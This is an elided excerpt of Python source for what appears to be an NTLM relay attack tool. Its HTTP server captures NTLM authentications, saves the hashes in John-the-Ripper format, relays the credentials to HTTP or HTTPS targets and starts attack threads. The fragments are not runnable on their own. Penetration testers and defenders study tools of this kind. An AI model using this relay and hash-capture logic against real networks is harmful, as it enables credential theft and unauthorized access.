...
class HTTPRelayServer(Thread):
	...
	class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
			...
			if messageType == 1:
				...
				if not self.do_ntlm_auth(token,authenticateMessage):
					if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
						LOG.error("Authenticating against %s://%s as %s\%s FAILED. Login recorded" % (
							self.target.scheme, self.target.netloc,
					...
					if self.server.config.outputFile is not None:
						writeJohnOutputToFile(
							datetime.datetime.now().strftime("'%Y/%m/%d %H:%M:%S'") + " Failed - " + ntlm_hash_data[
								'hash_string'], ntlm_hash_data['hash_version'], self.server.config.outputFile)
					...
					if self.server.config.outputFile is not None:
						writeJohnOutputToFile(datetime.datetime.now().strftime("'%Y/%m/%d %H:%M:%S'")+" Succeed - "+ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.config.outputFile)
			...
			if self.target.scheme.upper() == 'HTTP' or self.target.scheme.upper() == 'HTTPS':
				if self.target.port is None:
					if self.target.scheme.upper() == 'HTTP':
						...
						self.client = HTTPRelayClient(self.server.config, self.target, body=self.server.config.ewsBody)
					else:
						self.client = HTTPRelayClient(self.server.config, self.target, targetPort=443, body=self.server.config.ewsBody)
				else:
					if self.target.scheme.upper() == 'HTTP':
						self.client = HTTPRelayClient(self.server.config, self.target, body=self.server.config.ewsBody)
					else:
		...
		def do_attack(self):
			...
			if self.target.scheme.upper() in self.server.config.attacks:
				...
				clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config, self.client, self.authUser)
				clientThread.start()
			else:
	...
	def run(self):
		...
		self.server = self.HTTPServer((self.config.interfaceIp, int(self.config.httpport)), self.HTTPHandler, self.config)
